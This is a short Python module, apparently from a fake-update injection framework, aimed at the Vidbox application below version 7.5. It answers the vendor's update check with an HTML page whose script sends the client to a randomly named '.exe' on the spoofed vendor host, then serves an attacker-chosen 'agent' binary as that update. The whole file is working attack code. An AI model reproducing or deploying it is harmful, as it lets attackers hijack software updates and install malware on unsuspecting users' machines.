from modules import ModuleBase


class Vidbox(ModuleBase):
    name = 'Vidbox'
    version = '1.0'
    appver = '< 7.5'
    author = ['German Rodriguez < grodriguez +[AT]+ infobytesec.com >']
    description = ''
    vh = '(www.vidbox.001webs.com)'
    options = {
        'version': {
            'val': "'7.' + rand_num(2)",
            'hidden': 1,
            'dynamic': 1,
        },
        'rnd1': {
            'val': 'rand_num(5)',
            'hidden': 1,
            'dynamic': 1,
        }
    }
    requests = [{
            'path': '/',
            'type': 'string',
            'method': '',
            'bin': 0,
            'string': '<html><script>window.location="http://www.vidbox.001webs.com/update<%RND1%>.exe"</script></html>',
            'parse': 1,
            'file': '',
        }, {
            'path': '.exe',
            'type': 'agent',
            'method': '',
            'bin': 1,
            'string': '',
            'parse': 0,
            'file': ''
        }]
